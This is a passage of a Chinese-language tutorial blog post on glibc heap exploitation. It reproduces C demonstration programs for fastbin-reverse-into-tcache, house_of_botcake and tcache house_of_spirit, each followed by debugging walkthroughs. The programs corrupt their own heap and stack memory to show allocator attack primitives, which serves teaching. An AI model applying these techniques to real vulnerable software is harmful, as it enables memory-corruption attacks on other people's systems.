class="line"></span><br><span class="line">  <span class="comment">// Fill the tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span></span><br><span class="line">    <span class="string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Next we need to free between 1 and 6 more pointers. These will also go\n&quot;</span></span><br><span class="line">    <span class="string">&quot;in the fastbin. If the stack address that we want to overwrite is not zero\n&quot;</span></span><br><span class="line">    <span class="string">&quot;then we need to free exactly 6 more pointers, otherwise the attack will\n&quot;</span></span><br><span class="line">    <span class="string">&quot;cause a segmentation fault. But if the value on the stack is zero then\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a single free is sufficient.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the fastbin.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create an array on the stack and initialize it with garbage.</span></span><br><span class="line">  <span class="type">size_t</span> stack_var[<span class="number">6</span>];</span><br><span class="line">  <span class="built_in">memset</span>(stack_var, <span class="number">0xcd</span>, <span class="built_in">sizeof</span>(stack_var));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The stack address that we intend to target: %p\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It&#x27;s current value is %p\n&quot;</span>,</span><br><span class="line">    &amp;stack_var[<span class="number">2</span>],</span><br><span class="line">    (<span class="type">char</span>*)stack_var[<span class="number">2</span>]</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Now we use a vulnerability such as a buffer overflow or a use-after-free\n&quot;</span></span><br><span class="line">    <span class="string">&quot;to overwrite the next pointer at address %p\n\n&quot;</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Overwrite linked list pointer in victim.</span></span><br><span class="line">  *(<span class="type">size_t</span>**)victim = &amp;stack_var[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Empty tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Let&#x27;s just print the contents of our array on the stack now,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;to show that it hasn&#x27;t been modified yet.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="type">char</span>*)stack_var[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The next allocation triggers the stack to be overwritten. The tcache\n&quot;</span></span><br><span class="line">    <span class="string">&quot;is empty, but the fastbin isn&#x27;t, so the next allocation comes from the\n&quot;</span></span><br><span class="line">    <span class="string">&quot;fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Those 7 chunks are copied in reverse order into the tcache, so the stack\n&quot;</span></span><br><span class="line">    <span class="string">&quot;address that we are targeting ends up being the first chunk in the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It contains a pointer to the next chunk in the list, which is why a heap\n&quot;</span></span><br><span class="line">    <span class="string">&quot;pointer is written to the stack.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Earlier we said that the attack will also work if we free fewer than 6\n&quot;</span></span><br><span class="line">    <span class="string">&quot;extra pointers to the fastbin, but only if the value on the stack is zero.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;That&#x27;s because the value on the stack is treated as a next pointer in the\n&quot;</span></span><br><span class="line">    <span class="string">&quot;linked list and it will trigger a crash if it isn&#x27;t a valid pointer or null.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The contents of our array on the stack now look like this:\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="type">char</span>*)stack_var[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Finally, if we malloc one more time then we get the stack address back: %p\n&quot;</span>,</span><br><span class="line">    q</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">assert</span>(q == (<span class="type">char</span> *)&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="调试-19"><a href="#调试-19" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014193723730.png"
                      alt="image-20231014193723730"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014193755564.png"
                      alt="image-20231014193755564"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014193900312.png"
                      alt="image-20231014193900312"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014193928870.png"
                      alt="image-20231014193928870"
                ></p>
<p>首先申请 <code>14</code> 个 <code>chunk</code> ，先后将 <code>tcache</code> 和 <code>fastbinY[4]</code> 填满。其中 <code>victim</code> 指向第 <code>8</code> 个 <code>chunk</code> 也就是 <code>fastbinY[4]</code> 的最后一个 <code>chunk_ptrs[7]</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014194618108.png"
                      alt="image-20231014194618108"
                > </p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014194639500.png"
                      alt="image-20231014194639500"
                ></p>
<p>将 <code>victim(ptrs[7]_fd)</code> 指向 <code>stack_var[0]</code> 的位置，然后将 <code>tcache</code> 清空。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014194826822.png"
                      alt="image-20231014194826822"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014195140863.png"
                      alt="image-20231014195140863"
                ></p>
<p>这次 <code>malloc</code> 将会先从 <code>fastbin</code> 头部取出一个 <code>chunk</code>，然后把 <code>fastbin</code> 清空，放入<code>tcache</code>中，因为 <code>fastbin</code> 取出时从头开始，<code>tcache</code> 又是 <code>FIFO</code> 结构， 所以放入 <code>tcache</code> 是倒序的，把 <code>stack_var</code> 也算做了一个 <code>chunk</code>，所以是满 <code>7</code> 个。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014195254059.png"
                      alt="image-20231014195254059"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014195309680.png"
                      alt="image-20231014195309680"
                ></p>
<p>此时再去申请一个 <code>0x50</code> 大小的 <code>chunk</code> 将会把 <code>stack_var</code> 取出来，此时 <code>q == stack_var[2]</code> 。</p>
<h2 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house_of_botcake"></a>house_of_botcake</h2><p><code>libc-2.29</code> 新增加<code>double free</code>检查，方法是在 <code>tcache_entry</code> 结构体中新增加标志位 <code>key</code> 来检查 <code>chunk</code> 是否在 <code>tcache bin</code> 中。当 <code>free</code> 掉一个堆块进入 <code>tcache</code> 时，假如堆块的 <code>bk</code> 位存放的<code>key == tcache_key</code>， 就会遍历这个大小的 <code>Tcache</code> ，假如发现同地址的堆块，则触发 <code>double Free</code> 报错。因为 <code>chunk</code> 的 <code>key</code> 保存在 <code>bk</code> 位置，只需将其修改即可绕过 <code>double free</code> 检查。而 <code>house_of_botcake</code> 是另一种方法。</p>
<h3 id="源码-20"><a href="#源码-20" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This attack should bypass the restriction introduced in</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span></span><br><span class="line"><span class="comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span></span><br><span class="line"><span class="comment">     * simple tcache poisoning</span></span><br><span class="line"><span class="comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// disable buffering so _IO_FILE does not interfere with our heap</span></span><br><span class="line">    <span class="built_in">setbuf</span>(stdin, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// introduction</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This attack only relies on double free.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="type">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The address we want malloc() to return, namely,&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the target address is %p.\n\n&quot;</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare heap layout</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Preparing heap layout&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="built_in">sizeof</span>(x)/<span class="built_in">sizeof</span>(<span class="type">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a chunk for later consolidation&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): a=%p.\n&quot;</span>, a); </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a padding to prevent consolidation.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cause chunk overlapping</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we are able to cause chunk overlapping&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 1: fill up tcache list&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// simple tcache poisoning</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Launch tcache poisoning&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;We simply overwrite victim&#x27;s fwd pointer&quot;</span>);</span><br><span class="line">    b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="type">long</span>)stack_var;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// take target out</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we can cash out the target chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The new chunk is at %p\n&quot;</span>, c);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    <span class="built_in">assert</span>(c==stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Got control on target/stack!\n\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// note</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Note:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;In that case, once you have done this exploitation, you can have many arbitary writes very easily.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="调试-20"><a href="#调试-20" class="headerlink" title="调试"></a>调试</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015110448627.png"
                      alt="image-20231015110448627"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015110515624.png"
                      alt="image-20231015110515624"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015110726890.png"
                      alt="image-20231015110726890"
                ></p>
<p>首先申请<code>9</code>个 <code>non-fast_chunk</code> 和一个 <code>obstruct-chunk</code> ，将 <code>tcache</code>  填满，剩余两个放入 <code>unsorted_bin</code>，因为 <code>a</code> 与 <code>prev</code>相邻，所以会被整合在一起。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015110930692.png"
                      alt="image-20231015110930692"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015110909769.png"
                      alt="image-20231015110909769"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015111410250.png"
                      alt="image-20231015111410250"
                ></p>
<p>从 <code>tcache</code> 头部取出一个 <code>chunk</code> ，然后再次 <code>free(a)</code>，此时 <code>chunk_a</code> 同时出现在了 <code>unsorted_bin</code> 和 <code>tcache</code> 中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015111505547.png"
                      alt="image-20231015111505547"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015111750815.png"
                      alt="image-20231015111750815"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015111900959.png"
                      alt="image-20231015111900959"
                ></p>
<p>此时申请 <code>0x120</code> 大小的 <code>chunk</code> 将 <code>unsorted_bin</code> 中包含 <code>chunk_a_fd</code> 的 <code>chunk</code> 申请出来，我们就可以修改 <code>tcache</code> 中 <code>chunk_a</code> 的下一个链接进来的 <code>chunk</code> 为我们伪造的 <code>chunk</code>，在申请两次用户区为 <code>0x100</code> 大小的 <code>chunk</code> 就可以将我们伪造的 <code>chunk</code> 申请出来。</p>
<h2 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h2><h3 id="源码-21"><a href="#源码-21" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the house of spirit attack on tcache.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;It works in a similar way to original house of spirit but you don&#x27;t need to create fake chunk after the fake chunk that will be freed.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk&#x27;s size and prev_inuse are sane.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;(Search for strings \&quot;invalid next size\&quot; and \&quot;double free or corruption\&quot;)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Ok. Let&#x27;s start with the example!.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This region contains one fake chunk. It&#x27;s size field is placed at %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">	fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">	<span class="type">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>((<span class="type">long</span>)b == (<span class="type">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="调试-21"><a href="#调试-21" class="headerlink" title="调试"></a>调试</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015121919702.png"
                      alt="image-20231015121919702"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015121949906.png"
                      alt="image-20231015121949906"
                ></p>
<p>这种利用能够方法很简单，只需要将 <code>fake_chunks_size=0x40</code>，然后 <code>free(fake_chunk)</code> 即可将其放入到 <code>tcache</code> 中，再去申请 <code>0x30</code> 大小的 <code>chunk</code> 即可将其申请出来。</p>
